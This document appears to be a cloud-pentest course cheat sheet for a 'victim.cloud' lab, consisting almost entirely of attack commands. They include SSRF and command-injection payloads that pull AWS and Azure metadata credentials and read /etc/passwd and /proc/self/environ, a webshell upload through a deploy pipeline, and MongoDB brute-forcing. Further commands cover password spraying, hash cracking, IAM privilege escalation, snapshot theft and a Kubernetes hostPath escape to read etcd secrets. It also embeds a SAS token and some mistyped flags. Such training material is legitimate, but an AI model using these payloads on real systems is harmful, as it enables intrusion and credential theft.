@@ -1,0 +1,846 @@
+cloud command 
+
+Enumeration 1
+
+DNS Records
+
+dig victim.cloud NS +noall +answer
+dig -t MX victim.cloud +short
+dig @8.8.8.8 victim.cloud ANY +noall +answer
+for any in {TXT,MX,NS,A,SOA}; do dig @8.8.8.8 victim.cloud $any +nocmd +noall +answer; done
+
+
+SubDomain Enumeration
+
+python3 dnscan.py -R 1.1.1.1 -d victim.cloud -w subdomains.txt
+
+
+
+
+
+Enumeration 2
+
+●SSL certificates
+●Certificate Transparency
+●Search engines
+●Public datasets
+●DNS aggregators
+●Git repositories
+●Text parsing (HTML, JavaScript, documents…)
+GUI Way
+
+
+curl -s "https://crt.sh/?q=victim.cloud&output=json" | jq -r '.[].common_name' | sort -u | tee ~/targets.txt
+curl -s "https://crt.sh/?q=victim.cloud&output=json" | jq -r '.[] | .common_name + ":" + .issuer_name' | sort -u
+for i in $(cat targets.txt); do for a in $(dig -t A $i +short | grep -E "[0-9\.]{7,15}" | head -1); do echo "\n--- $i ---"; whois $a | grep -E "Organi[zs]ation|descr"; done; done
+
+
+
+
+Enumeration 3
+
+curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@victim.cloud&xml=1" | grep -E --colour '<NameSpaceType>[^<]+</NameSpaceType>'
+curl -s -X POST https://login.microsoftonline.com/common/GetCredentialType -d ""{\"Username\":\"test@victim.cloud\"}"" | jq -e '.IfExistsResult'
+curl -s -X POST https://login.microsoftonline.com/common/GetCredentialType -d ""{\"Username\":\"bob@victim.cloud\"}"" | jq -e '.IfExistsResult'
+
+enum_azuread_users victim.cloud popular_names_list.txt
+
+
+
+
+Gaining Entry Via Exposed Services
+
+Entry 1
+
+●Obtain AWS API access token keys by exploiting a SSRF/Directory Traversal vulnerability on
+a serverless function hosted at
+https://awslambda.victim.cloud/proxy?page=http://notsosecure.com
+
+
+●Identify a similar vulnerability on an Azure function hosted at
+https://azurefunction.victim.cloud/api/victimproxy?page=http://notsosecure.com and
+verify if it is possible to obtain the Azure access tokens.
+
+
+https://awslambda.victim.cloud/proxy?page=http://127.0.0.1:22 -->> monitor the error
+https://awslambda.victim.cloud/proxy?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+https://awslambda.victim.cloud/proxy?page=file:/etc/passwd
+curl -i -X GET https://awslambda.victim.cloud/proxy?page=file:/etc/passwd
+curl -i -X GET https://awslambda.victim.cloud/proxy?page=file:/proc/self/environ
+
+
+http://azurefunction.victim.cloud/api/victimproxy?page=http://169.254.169.254/metadata
+curl -i http://azurefunction.victim.cloud/api/victimproxy?page=http://169.254.169.254/metadata
+
+
+
+Entry 2
+
+●Identify and exploit SSRF vulnerability to gain access to S3 buckets and download the
+source of the application hosted on AWS cloud. Further, Upload a webshell via Continuous
+Deployment (CD) pipeline
+http://userX.victim.cloud/index.php?doc=https://raw.githubusercontent.com/NotSoSecure/StaticResource/main/Cloud/cloud-memes.jpg
+
+
+●Obtain the cloud access token by exploiting a command injection vulnerability in the web
+application hosted on azure at: http://webapp2.victim.cloud/
+
+
+
+“http://userX.victim.cloud/index.php?doc=https://raw.githubusercontent.com/NotSoSecure/StaticResource/main/Cloud/cloud-memes.jpg”
+
+curl http://userX.victim.cloud/index.php?doc=http://169.254.169.254/latest/meta-data/iam/info  --->> retrieve the Account ID
+
+curl http://userX.victim.cloud/index.php?doc=http://169.254.169.254/latest/dynamic/instance-identity/document --->> Retrieve the region
+
+curl http://userX.victim.cloud/index.php?doc=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role ---->> retrieve the AccessKeyId
+
+
+
+Setup AWS Command Line Interface (CLI)
+export AWS_ACCESS_KEY_ID=
+export AWS_SECRET_ACCESS_KEY=
+export AWS_SESSION_TOKEN=
+export AWS_DEFAULT_REGION=us-east-2
+
+
+aws s3 ls
+
+AWS Managed Policy ARN: arn:aws:iam::aws:policy/AWSElasticBeanstalkWebTier
+aws s3 ls s3://elasticbeanstalk-us-east-2-266909425344/ --recursive
+
+
+download the source code using the following command.
+
+aws s3 cp s3://elasticbeanstalk-us-east-2-266909425344/cih-ebs-userX/ . --recursive
+
+
+Add newly created file to the index.zip file as shown below:
+Command:
+zip -ur index.zip user<ID>.php
+
+
+Now, upload an archive file to S3 bucket using the AWS CLI command
+Command:
+aws s3 cp index.zip s3://elasticbeanstalk-us-east-2-266909425344/cih-ebs-userX/
+
+
+
+To view the webshell 
+
+userX.victim.cloud/<userID>.php
+
+
+
+
+
+Exploit command injection vulnerability to fetch access-token
+
+
+http://webapp2.victim.cloud/?cmd=ping+-c3+8.8.8.8
+http://webapp2.victim.cloud/?cmd=uname+-a
+http://webapp2.victim.cloud/?cmd=curl+-H+Metadata:true+--noproxy+%22*%22+%22http://169.254.169.254/metadata/versions%22
+http://webapp2.victim.cloud/?cmd=curl+-L+-H+Metadata:true+%22http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/%22
+
+curl http://webapp2.victim.cloud/?cmd=curl+-i+-H+Metadata:true+%22http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/%22
+
+
+
+
+
+Entry 3
+
+●Enumerate an exposed service on db.victim.cloud domain.
+●Identify and exploit the misconfiguration and extract as much information as possible with the
+gained access.
+
+nmap -Pn -n --top-ports=3000 db.victim.cloud
+
+for i in `grep -v "^#" /usr/share/nmap/nselib/data/passwords.lst`; do echo $i && mongo -u admin -p $i --authenticationDatabase admin --host db.victim.cloud; done
+
+mongo -u admin -p password --authenticationDatabase admin --host db.victim.cloud
+
+
+
+
+
+
+Attacking Specific Cloud Services
+
+Storage 1
+
+python3 cloud_enum.py -k victim -ns 8.8.8.8 -m mutation.txt -t 2
+
+
+URL: http://victimpublic.s3.amazonaws.com/
+
+
+aws --no-sign-request s3 cp s3://victimpublic/public_file.md public.txt ---->> to download with cli
+
+aws s3 ls victimauth --profile attacker
+
+aws s3 cp s3://victimauth/auth_file.md auth_file.md
+
+
+gsutil ls -L gs://victimpublic
+
+gsutil cp gs://[BUCKET_NAME]/[OBJECT_NAME] [OBJECT_DESTINATION]
+gsutil cp gs://victimpublic/public_file.md public_file.md
+
+
+
+az storage account check-name --name victimpublic ---->> check if particular storage account exists
+
+https://[Valid-storage-account-name].blob.core.windows.net/[Container-name]?restype=container --->> bruteforce the container name
+
+https://victimpublic.blob.core.windows.net/data?restype=container&comp=list
+
+
+https://victimpublic.blob.core.windows.net/data/download.txt --->> To download
+
+
+
+
+
+https://victimassets.blob.core.windows.net/?restype=container&comp=list&sv=2019-12-12&ss=b&srt=sco&sp=rlx&se=2024-05-01T06:37:53Z&st=2020-07-25T22:37:53Z&spr=https&sig=Ao%2BvQCGo0EpzWNgPQXGVgqIB43HiQ4fHVQU7nbjg1lA%3D
+
+https://victimassets.blob.core.windows.net/secret?restype=container&comp=list&sv=2019-12-12&ss=b&srt=sco&sp=rlx&se=2024-05-01T06:37:53Z&st=2020-07-25T22:37:53Z&spr=https&sig=Ao%2BvQCGo0EpzWNgPQXGVgqIB43HiQ4fHVQU7nbjg1lA%3D
+
+
+https://victimassets.blob.core.windows.net/secret/super_secret_notes.txt?sv=2019-12-12&ss=b&srt=sco&sp=rlx&se=2024-05-01T06:37:53Z&st=2020-07-25T22:37:53Z&spr=https&sig=Ao%2BvQCGo0EpzWNgPQXGVgqIB43HiQ4fHVQU7nbjg1lA%3D
+
+
+
+
+
+
+
+Attacking Specific Cloud Services
+AD 1
+●
+Compromise the password of one valid user identified in enumeration phase using password
+spraying
+
+
+python3 MSOLSpray.py -u victim.cloud-userlist.txt -p Season20 ----->> password spray
+
+
+
+
+
+AD 2
+●Enumerate the resources we have access to as bob
+●Escalate to an account with higher privileges using a targeted attack
+
+
+az login -u Bob@victim.cloud -p 'Season20' --allow-no-subscriptions
+
+az ad user list | grep "userPrincipalName" | cut -d '"' -f 4 | tee targetteduserlist.txt
+
+for i in $(cat targetteduserlist.txt); do echo "------ $i ------"; az ad user get-member-groups --id $i | grep displayName 2>/dev/null | cut -d'"' -f 4; done
+
+python3 MSOLSpray.py -u targetteduserlist.txt -p Season20
+
+az login -u keyvaultadmin@victim.cloud -p 'Season20'
+
+roadrecon auth -u bob@victim.cloud -p Season20
+
+roadrecon gather
+
+roadrecon gui
+
+
+
+
+
+
+
+
+
+AD 3
+●Using keyvaultadmin try to gain access to keyvault
+●Obtain credentials for the database
+●Perform port scan on the disclosed database address
+
+az login -u keyvaultadmin@victim.cloud -p 'Season20'
+
+az keyvault list
+
+az keyvault secret list --vault-name resource-creds
+
+az keyvault secret show --id https://resource-creds.vault.azure.net/secrets/dbreader-pass
+
+nmap -T2 -sV victim.database.windows.net
+
+
+
+
+
+
+
+
+
+
+AD 4
+●Gain access to the database via compromised credentials
+●Obtain the authentication table details from database
+●Using rock-you dictionary try to crack the hashes
+
+
+pentester@kali:~/tools/MSOLSpray$ mssql-cli -S victim.database.windows.net -d user_data
+
+user_data> SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
+
+user_data> describe "dbo"."voffice_auth_2019"
+
+user_data> select username, md5 from "dbo"."voffice_auth_2019"
+
+mssql-cli -S victim.database.windows.net -d user_data -Q 'select username, md5 from "dbo"."voffice_auth_2019"' -o user_data_unformatted
+
+cat user_data_unformatted
+
+perl -l -n -e '/([A-Za-z]+@[^ ]+).+([a-f0-9]{32})/ && print ($1, ":", $2)' user_data_unformatted |
+tee user_data_formatted
+
+cd ~/tools/john/run:
+
+./john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt /home/pentester/tools/MSOLSpray/user_data_formatted
+
+
+
+
+
+
+
+
+
+AD 5
+●Create a targeted wordlist via official website
+●Crack the hashes using the created wordlist
+●Gain access to azureauditaccount account
+
+
+cewl -d2 -m8 https://victim.cloud | grep -v "CeWL" | sudo /home/pentester/tools/john/run/john --pipe --rules:KoreLogic --stdout | head -n 1000 > targettedwordlist.txt
+
+sudo /home/pentester/tools/john/run/john --format=Raw-MD5 --wordlist=targettedwordlist.txt user_data_formatted
+
+az login -u azureauditaccount@victim.cloud -p '39Solutions'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Attacking Specific Cloud Services
+
+Cognito 1
+●	Explore the voffice application and gain access to s3 bucket victimprivate via cognito service
+
+
+aws cognito-identity get-id --identity-pool-id us-east-2:4a86231e-4c11-4a6e-ac3b-e007ab79a9c0 --region us-east-2
+
+aws cognito-identity get-credentials-for-identity --identity-id <Replace IdentityId> --region us-east-2
+
+export AWS_ACCESS_KEY_ID=
+export AWS_SECRET_ACCESS_KEY=
+export AWS_SESSION_TOKEN=
+
+aws sts get-caller-identity
+
+aws s3 ls
+
+aws s3 ls s3://victimprivate
+
+aws s3 cp s3://victimprivate/private_file.md .
+
+
+
+
+
+
+
+IAM: Shadow Admin
+
+Shadow Admin Lab 1
+
+● Escalate your privileges to read the sensitive information from the environment variable of the
+Lambda function "secretLambda".
+
+Note: Use the AWS account to generate the access keys provided for this class and configure the CLI
+
+
+aws configure –-profile userX
+
+aws sts get-caller-identity --profile userX
+
+aws –-profile userX iam list-attached-user-policies --user-name userX
+
+aws --profile userX iam get-policy --policy-arn arn:aws:iam::143439767741:policy/userX
+
+aws --profile userX iam list-policy-versions --policy-arn arn:aws:iam::143439767741:policy/userX
+
+aws --profile userX iam get-policy-version --policy-arn arn:aws:iam::143439767741:policy/userX --version-id v3
+
+aws --profile userX iam get-policy-version --policy-arn arn:aws:iam::143439767741:policy/userX --version-id v2 aws --profile userX iam get-policy-version --policy-arn arn:aws:iam::143439767741:policy/userX --version-id v1
+
+aws --profile userX lambda list-functions --region us-east-1
+
+aws --profile userX iam set-default-policy-version --policy-arn arn:aws:iam::143439767741:policy/userX --version-id v1
+
+aws --profile userX iam get-policy --policy-arn arn:aws:iam::143439767741:policy/userX
+
+aws --profile userX lambda list-functions --region us-east-1
+
+
+
+
+
+
+
+
+
+
+Shadow Admin Lab 2
+•
+•
+Using PassRole permission become a part of the ‘cih_secret’ group.
+Extract the flag from the Secret Manager after becoming the part of the cih_secret’ group.
+
+aws configure --profile userX
+
+aws --profile userX sts get-caller-identity
+
+aws --profile userX iam list-attached-user-policies --user-name userX
+
+aws --profile userX iam get-policy --policy-arn arn:aws:iam::143439767741:policy/cih-passrole-ec2
+
+aws --profile userX iam get-policy-version --policy-arn arn:aws:iam::143439767741:policy/cih-passrole-ec2 --version-id v1
+
+aws --profile userX iam list-groups-for-user --user-name userX
+
+aws --profile userX iam list-groups
+
+aws --profile userX iam list-attached-group-policies --group-name cih_secret
+
+aws --profile userX iam get-policy-version --policy-arn arn:aws:iam::143439767741:policy/cih-passrole-groupSecret-policy --version-id v1
+
+aws --profile userX iam add-user-to-group --group-name cih_secret --user-name userX
+
+aws --profile userX iam list-roles
+
+aws --profile userX iam list-attached-role-policies --role-name cih-role-passrole
+
+aws --profile userX iam get-policy-version --policy-arn arn:aws:iam::143439767741:policy/cih_passrole_addToGroup --version-id v1
+
+aws --profile userX ec2 run-instances --image-id ami-02541b8af977f6cdd --instance-type t2.micro --iam-instance-profile Name="cih-role-passrole" --key-name "cih-passrole" --security-group-ids sg-012f53274cf61203f --region us-west-1 --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=userX}]'
+
+aws --profile userX --region us-west-1 ec2 describe-instances --instance-ids <available_after_creating_the_instance> --query "Reservations[*].Instances[*].PublicIpAddress" --output=text
+
+nano cih-passrole.pem
+
+ssh -i cih-passrole.pem ec2-user@<ec2_Public_IP>
+
+aws iam add-user-to-group --group-name cih_secret --user-name userX
+
+aws --profile userX iam list-groups-for-user --user-name userX
+
+aws –profile userX secretsmanager list-secrets --region us-west-1
+
+aws –profile userX secretsmanager get-secret-value --secret-id CIH_PASSROLE_SECRET --region us-west-1
+
+
+
+
+
+
+
+
+
+
+Shadow Admin Lab 3
+AWS provides a service called Cross-Account access, in which the user can access the resources
+of another AWS account without creating a user profile in the other account.
+In this lab students will learn the following things:
+•
+•
+Obtain temporary session token using AssumeRole service.
+Escalate your privileges by assuming a vulnerable role in the AWS account and read the flag
+from Lambda function. Important Points:
+
+
+
+aws --profile userX sts get-caller-identity
+
+aws --profile userX sts assume-role --role-arn arn:aws:iam::266909425344:role/CIH_crossAccount_s3Read_limited --role-session-name "limited"
+
+export AWS_ACCESS_KEY_ID=
+export AWS_SECRET_ACCESS_KEY=
+export AWS_SESSION_TOKEN=
+
+aws sts get-caller-identity
+
+aws iam list-roles
+
+aws s3 ls
+
+aws --region us-east-1 lambda list-functions
+
+aws --profile userX sts assume-role --role-arn arn:aws:iam::266909425344:role/CIH_crossAccount_vulnerableRole --role-session-name "notlimited"
+
+export AWS_ACCESS_KEY_ID=
+export AWS_SECRET_ACCESS_KEY=
+export AWS_SESSION_TOKEN=
+
+aws sts get-caller-identity
+
+aws --region us-east-1 lambda list-functions
+
+
+
+
+
+
+Shadow Admin Lab 4
+•
+Clone the private repository of another AWS account by exploiting the misconfiguration of S3
+bucket.
+
+cd /home/pentester/tools/cloud-service-enum/aws_service_enum
+
+python3 aws_service_enum.py --access-key <access_key> --secret-key <secret_key> --region-all
+
+aws configure --profile attacker
+
+aws s3api list-objects --bucket cih-victim-serverless-app --profile attacker
+
+aws serverlessrepo --profile userX update-application --application-id arn:aws:serverlessrepo:us-east-1:143439767741:applications/userX --readme-url https://cih-victim-serverless-app.s3.amazonaws.com/93b7227109354f0df02f28604258ed85 --region us-east-1
+application-id --> SAR Application ID belongs to the Attacker account.readme-url --> Victim account S3 bucket URL.
+
+
+
+
+
+
+Post Exploitation
+Exploit 1
+●
+Perform post access enumeration on all the given environments.
+
+cd ~/tools/cloud-service-enum/aws_service_enum/
+
+curl https://awslambda.victim.cloud/proxy?page=file:///proc/self/environ | sed 's/\\u0000/\n/g' | grep 'AWS_ACCESS_KEY_ID\|AWS_SECRET_ACCESS_KEY\|AWS_SESSION_TOKEN' | tee ~/token.tmp
+
+while read x; do export $x; done < ~/token.tmp
+
+python3 aws_service_enum.py --access-key replace --secret-key replace --region us-east-2 --verbose --session-token replace
+
+curl http://webapp2.victim.cloud/?cmd=curl+-i+-H+Metadata:true+%22http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018- 02-01%26resource=https://management.azure.com/%22
+
+cd ~/tools/cloud-service-enum/azure_service_enum/
+
+python3 azure_service_enum.py --logs --access-token <Replace-Access-Token-Here>
+
+
+
+
+
+
+
+Exploit 2
+●
+Enumerate a public snapshot associated with the account and extract sensitive information
+from the given snapshots.
+
+curl https://awslambda.victim.cloud/proxy?page=file:///proc/self/environ | sed 's/\\u0000/\n/g' | grep 'AWS_ACCESS_KEY_ID\|AWS_SECRET_ACCESS_KEY\|AWS_SESSION_TOKEN' | tee ~/token.tmp
+
+while read x; do export $x; done < ~/token.tmp
+
+aws sts get-caller-identity
+
+aws ec2 describe-snapshots --owner-id 722498266782 --region us-east-2
+
+aws --region us-west-2 ec2 copy-snapshot --source-region us-east-2 --source-snapshot-id snap-033299cd7e85a85a9 --description "Snapshot Exercise." --profile userX --tag-specifications 'ResourceType=snapshot,Tags=[{Key=Name,Value=userX}]'
+
+aws ec2 describe-snapshots --owner-id 143439767741 --region us-west-2 --snapshot-ids <snapshotID> --profile userX
+
+nano cih-snapshot-lab.pem
+
+aws ec2 describe-subnets --region us-west-2 --profile userX --filters "Name=availability-zone,Values=us-west-2a"
+
+aws ec2 run-instances --image-id ami-00ee4df451840fa9d --instance-type t2.micro --security-group-ids sg-07a5e093771a795c6 --key-name cih-snapshot-lab --subnet-id <sbunet_ID> --profile userX --region us-west-2 --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=userX}]' 'ResourceType=volume,Tags=[{Key=Name,Value=userX}]'
+
+aws --region us-west-2 ec2 describe-instances --instance-ids <available_after_creating_the_instace> --query "Reservations[*].Instances[*].PublicIpAddress" --output=text --profile userX
+
+aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id <valid snapshot id> --profile userX --tag-specifications 'ResourceType=volume,Tags=[{Key=Name,Value=userX}]'
+
+aws ec2 attach-volume --volume-id <valid volume id> --instance-id <valid instance id> --device /dev/sdf --profile userX --region us-west-2
+
+chmod 400 cih-snapshot-lab.pem
+
+ssh -i "cih-snapshot-lab.pem" ec2-user@ip_or_dns_of_instance
+
+lsblk
+
+sudo mount /dev/xvdf1 /mnt
+
+sudo su
+
+cd /mnt/root/
+
+ls -la
+
+
+
+
+
+
+
+
+
+
+
+Troubleshooting:
+$ sudo mount /dev/xvdf1 /mnt
+mount: /mnt: wrong fs type, bad option, bad superblock on /dev/xvdf1, missing codepage or
+helper program, or other error.
+Debugging might not yield anything useful
+$ sudo file -s /dev/xvdf1
+/dev/xvdf1: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)
+$ sudo mount /dev/xvdf1 /mnt -t xfs
+mount: /mnt: wrong fs type, bad option, bad superblock on /dev/xvdf1, missing codepage or
+helper program, or other error.
+However if you check /var/log/messages you will see these error messages
+$ sudo cat /var/log/messages
+kernel: XFS (xvdf1): Filesystem has duplicate UUID 417df3d5-5cb9-4b5e-a1a2-8475fff8efc9 -
+can't mount
+kernel: XFS (xvdf1): Filesystem has duplicate UUID 417df3d5-5cb9-4b5e-a1a2-8475fff8efc9 -
+can't mount
+If you see this error message this generally occurs if you have created exact same type of ami that
+was used to create this particular AMI. In which case a slight tweak in the Command: will help you.
+sudo mount -t xfs -o nouuid /dev/xvdf1 /mnt
+
+
+
+
+
+
+
+
+
+Containers
+
+Container 1
+●Start a docker container alpine:latest
+●Explore the internals of the container
+
+
+docker run alpine:latest ps aux
+
+docker run alpine:latest cat /proc/1/cgroup
+
+
+
+
+
+
+Container 2
+●
+Victim.cloud attempted to play with docker and created
+https://hub.docker.com/r/victimcloud/baseimage
+●Identify if there is any misconfigurations in the Image[s] using Dockle
+●Use Dive to access the AWS credentials leaked in misconfigured container image and
+confirm the level of access you have on the AWS account
+
+
+dockle victimcloud/baseimage
+
+dockle victimcloud/baseimage:v1
+
+dockle victimcloud/baseimage:v0.1
+
+docker pull victimcloud/baseimage:v0.1
+
+dive victimcloud/baseimage:v0.1
+
+docker run --rm -it victimcloud/baseimage:v0.1 /bin/sh
+
+mkdir dive1
+cd dive1/
+docker save victimcloud/baseimage:v0.1 -o baseimage.tar
+
+tar -xvf baseimage.tar
+
+cd 76ef45eb3ed25e5dd9c3c3c4127d7579a0be19941f5c6522da72a8460366598b/
+
+ls -la
+
+tar -xvf layer.tar
+
+cat root/.aws/credentials
+
+aws configure
+
+aws sts get-caller-identity
+
+
+
+
+
+
+
+
+Container 3
+
+In this exercise we will use open-source tool cosign to sign and verify container images
+●Generate keys to sign and verify images
+●Run local container registry
+●Upload an alpine image in local container registry
+●Sign the alpine image uploaded in local container registry
+●Verify the signature of alpine image present on local container registry
+
+
+cosign generate-key-pair
+
+ls
+
+docker run -d -p 5000:5000 --restart=always --name registry registry:2
+
+docker ps
+
+docker pull alpine
+
+docker tag alpine localhost:5000/alpine:signed
+
+docker push localhost:5000/alpine:signed
+
+cosign sign --key cosign.key localhost:5000/alpine:signed
+
+cosign verify --key cosign.pub localhost:5000/alpine:signed
+
+docker ps
+
+docker rm -f registry
+
+
+
+
+
+
+
+Kubernetes
+K8s: Introduction
+●Create a basic k8s cluster
+●Perform basic recon operations
+●Create a YAML file deploying nginx image
+●Destroy the cluster
+
+
+kind create cluster
+
+kubectl get pods
+
+kubectl get pods -A
+
+kubectl get nodes -o wide
+
+nano pod.yaml
+Paste/Type following inside the file
+apiVersion: v1
+kind: Pod
+metadata:
+name: nginx
+spec:
+containers:
+- name: web
+image: nginx
+Now save the file and exit
+
+
+cat pod.yaml
+
+kubectl create -f pod.yaml
+
+kubectl get pods
+
+kind delete cluster
+
+
+
+
+
+
+Exploiting K8s Cluster
+●Find and exploit the vulnerability exposing sensitive data.
+●Use this to discover additional exposed resources, pivot through the pods to gain the hidden
+flag in ‘flag.txt’ file.
+●
+Finally use these additional privileges to access a supersecrettoken hidden in etcd.
+
+
+nmap -Pn -n -vv -n --open -p- -T5 xx.xx.xx.xx -oA ctf_nmap
+
+http://xx.xxx.xx.xx/shell.php?cmd=id
+
+http://xx.xxx.xx.xx/shell.php?cmd=env
+
+http://xx.xxx.xx.xx/shell.php?cmd=curl%20<IDENTITY_APP_SVC_PORT>
+
+nmap -Pn -vv -p- --open xx.xxx.xx.xx -T5
+
+http://xx.xx.xx.xx:44459/
+
+curl http://xx.xxx.xx.xx/shell.php?cmd=curl%20<IDENTITY_APP_SVC_PORT>
+
+kubectl --token=`cat token` --server=https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify auth can-i --list
+
+kubectl --token=`cat token` --server=https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify auth can-i --list -n prod
+
+kubectl --token=`cat token` --server=https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify -n prod get pods
+
+wget https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
+
+kubectl --token=`cat token` --server=https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify apply -f hostpath-exec-pod.yaml -n prod
+
+kubectl --token=`cat token` --server=https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify -n prod get pods -o wide
+
+kubectl --token=`cat token` --server=https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify -n prod exec -it hostpath-exec-pod -- bash
+
+ls host
+
+root@hostpath-exec-pod:/# chroot host/ bash
+
+root@hostpath-exec-pod:/# crictl ps
+
+crictl inspect <container_ID> |more
+
+ls /run/containerd/io.containerd.runtime.v2.task/k8s.io/<container-id>/rootfs/
+
+cat /run/containerd/io.containerd.runtime.v2.task/k8s.io/<container-id>/rootfs/flag.txt
+
+kubectl --kubeconfig=/etc/kubernetes/kubelet.conf config view
+
+kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get nodes
+
+kubectl --kubeconfig=/etc/kubernetes/kubelet.conf get secrets
+
+wget https://raw.githubusercontent.com/mauilion/blackhat-2019/master/etcd-attack/etcdclient.yaml
+
+cat etcdclient.yaml
+
+kubectl --token=`cat token` --server=https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify apply -f etcdclient.yaml -n prod
+
+kubectl --token=`cat token` --server==https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify get pod -n prod -o wide
+
+kubectl --token=`cat token` --server==https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify exec -n prod -it etcdclient -- etcdctl get '' --keys-only --from-key | grep secrets
+
+kubectl --token=`cat token` --server==https://xx.xxx.xx.xx:<APIserver-port> --insecure-skip-tls-verify exec -n prod -it etcdclient -- sh / # etcdctl get /registry/secrets/default/supersecrettoken
+
+echo "RkxBRzogSHVycmF5LCXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXDVEYsIHlvdSBhcmUgYXdlc29tZS4K" | base64 -d
